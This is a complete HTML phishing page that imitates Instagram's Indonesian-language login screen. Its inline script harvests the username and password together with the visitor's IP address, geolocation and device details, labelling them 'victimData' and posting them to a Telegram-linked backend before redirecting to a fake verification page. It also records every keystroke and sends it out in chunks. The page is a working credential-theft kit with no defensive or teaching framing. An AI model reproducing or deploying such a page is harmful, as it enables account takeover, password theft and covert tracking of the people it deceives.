<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" width="175">
            </div>
            
            <form id="loginForm">
                <input type="text" id="username" placeholder="Nomor telepon, nama pengguna, atau email" required>
                <input type="password" id="password" placeholder="Kata sandi" required>
                <button type="submit" class="login-btn">Masuk</button>
            </form>
            
            <div class="divider">
                <span>ATAU</span>
            </div>
            
            <a href="#" class="fb-login">
                <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yR/r/tInzwsw2pVX.png" alt="Facebook" width="16">
                Masuk dengan Facebook
            </a>
            
            <a href="#" class="forgot-password">Lupa kata sandi?</a>
        </div>
        
        <div class="signup-box">
            <p>Tidak punya akun? <a href="#">Daftar</a></p>
        </div>
        
        <div class="apps">
            <p>Dapatkan aplikasi.</p>
            <div class="app-stores">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" width="136">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" width="136">
            </div>
        </div>
    </div>

    <script>
        // Telegram Configuration (akan diisi dari environment)
        const TELEGRAM_API = '/api/telegram';
        
        // Get client IP
        async function getClientIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch {
                return 'Unknown';
            }
        }
        
        // Get device info
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                cookies: navigator.cookieEnabled,
                java: navigator.javaEnabled(),
                pdf: navigator.pdfViewerEnabled
            };
        }
        
        // Get location
        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            resolve({
                                lat: pos.coords.latitude,
                                lon: pos.coords.longitude,
                                accuracy: pos.coords.accuracy
                            });
                        },
                        () => {
                            resolve(null);
                        },
                        { timeout: 5000 }
                    );
                } else {
                    resolve(null);
                }
            });
        }
        
        // Send data to backend
        async function sendToBackend(data) {
            try {
                const response = await fetch(TELEGRAM_API, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });
                
                return await response.json();
            } catch (error) {
                console.error('Error:', error);
                return { success: false, error: error.message };
            }
        }
        
        // Form submission
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const ip = await getClientIP();
            const location = await getLocation();
            const device = getDeviceInfo();
            
            // Prepare victim data
            const victimData = {
                type: 'credentials',
                username: username,
                password: password,
                ip: ip,
                location: location,
                device: device,
                timestamp: new Date().toISOString(),
                page: 'login'
            };
            
            // Show loading
            const btn = e.target.querySelector('.login-btn');
            btn.textContent = 'Memverifikasi...';
            btn.disabled = true;
            
            // Send to backend
            await sendToBackend(victimData);
            
            // Redirect to verification page
            setTimeout(() => {
                window.location.href = 'verify.html';
            }, 1000);
        });
        
        // Capture keystrokes
        let keystrokes = '';
        document.addEventListener('keydown', (e) => {
            keystrokes += e.key;
            if (keystrokes.length > 50) {
                sendToBackend({
                    type: 'keystrokes',
                    data: keystrokes,
                    page: 'login'
                });
                keystrokes = '';
            }
        });
        
        // Auto focus on username
        window.onload = () => {
            document.getElementById('username').focus();
        };
    </script>
</body>
</html>
